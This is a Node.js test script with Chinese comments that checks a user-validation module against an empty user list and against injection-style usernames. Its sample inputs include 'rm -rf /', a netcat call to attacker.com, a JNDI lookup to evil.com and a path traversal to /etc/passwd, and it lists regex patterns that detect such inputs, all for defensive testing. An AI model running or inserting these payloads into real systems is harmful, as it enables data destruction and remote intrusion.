#!/usr/bin/env node

/**
 * 测试高级用户验证模块
 */

const os = require('os');
const { validateTestRun } = require('./redesigned-user-validation.js');

console.log('=== 测试高级用户验证模块 ===\n');

// 测试1: 空用户列表验证
console.log('测试1: 空用户列表验证');
const emptyConfig = {
  type: 'integration',
  name: '空用户列表测试',
  description: '测试空用户列表验证',
  showRecommendations: false
};

const emptyResult = validateTestRun(emptyConfig);
console.log(`结果: ${emptyResult.valid ? '通过' : '拒绝'}`);
console.log(`原因: ${emptyResult.impact.description}\n`);

// 测试2: 注入攻击用户名验证
console.log('测试2: 注入攻击用户名验证');
const injectionUsernames = [
  'admin; rm -rf /',
  '../../etc/passwd',
  'user|nc attacker.com 4444',
  '${jndi:ldap://evil.com/a}',
  'user\u0000admin'
];

for (const username of injectionUsernames) {
  console.log(`测试用户名: ${username}`);
  
  // 检查用户名是否包含注入攻击模式
  const injectionPatterns = [
    /;\s*rm\s+-rf/, // 删除命令
    /\.\.[\/\\]/, // 路径遍历
    /\|\s*nc/, // 网络连接
    /\$\{.*\}/, // 变量替换
    /\x00/, // 空字节注入
    /&&\s*\w+/, // 命令连接
    /\|\|\s*\w+/, // 命令连接
    /`.*`/, // 命令替换
    /\$\(.*\)/, // 命令替换
  ];
  
  const hasInjection = injectionPatterns.some(pattern => pattern.test(username));
  console.log(`包含注入攻击: ${hasInjection ? '是' : '否'}`);
  
  // 创建模拟用户
  const mockUser = {
    username: username,
    uid: 1000,
    gid: 1000,
    homedir: '/home/test',
    shell: '/bin/bash'
  };
  
  // 替换os.userInfo
  const originalOsUserInfo = os.userInfo;
  os.userInfo = () => mockUser;
  
  try {
    const injectionConfig = {
      type: 'integration',
      name: '注入攻击测试',
      description: '测试包含注入攻击的用户名',
      showRecommendations: false
    };
    
    const result = validateTestRun(injectionConfig, mockUser);
    console.log(`验证结果: ${result.valid ? '通过' : '拒绝'}`);
    console.log(`原因: ${result.impact.description}`);
  } finally {
    // 恢复原始函数
    os.userInfo = originalOsUserInfo;
  }
  
  console.log('');
}